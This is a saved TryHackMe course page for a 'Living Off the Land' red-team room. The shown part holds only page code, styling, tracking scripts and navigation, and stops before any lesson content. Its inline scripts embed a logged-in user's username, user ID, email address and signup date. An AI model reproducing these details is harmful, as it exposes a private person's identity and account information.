<!DOCTYPE html>
<!-- saved from url=(0043)https://tryhackme.com/room/livingofftheland -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Living Off the Land</title>
<meta name="description" content="Learn the essential concept of &quot;Living Off the Land&quot; in Red Team engagements.">
<meta name="og:description" content="Learn the essential concept of &quot;Living Off the Land&quot; in Red Team engagements.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Living Off the Land">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/e4c6a1e8fc63869476ab415e674585bb.png">
<meta property="og:url" content="https://tryhackme.com/room/livingofftheland">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn the essential concept of &quot;Living Off the Land&quot; in Red Team engagements.">

<script type="text/javascript" async="" src="./TryHackMe _ Living Off the Land_files/pgpbhph6"></script><script src="./TryHackMe _ Living Off the Land_files/jquery.min.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Living Off the Land_files/boostrap431.min.css">
<script src="./TryHackMe _ Living Off the Land_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Living Off the Land_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Living Off the Land_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Living Off the Land_files/general-style.css">
<script src="./TryHackMe _ Living Off the Land_files/script.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Living Off the Land_files/cookieconsent.min.css">
<script src="./TryHackMe _ Living Off the Land_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Living Off the Land_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Living Off the Land_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Living Off the Land_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><script async="" src="./TryHackMe _ Living Off the Land_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Living Off the Land_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Living Off the Land_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Living Off the Land_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Living Off the Land_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Living Off the Land_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Living Off the Land_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Living Off the Land_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Living Off the Land_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Living Off the Land_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/livingofftheland#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/livingofftheland#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>

<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 17:19:58 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/livingofftheland#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/livingofftheland#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Living Off the Land_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
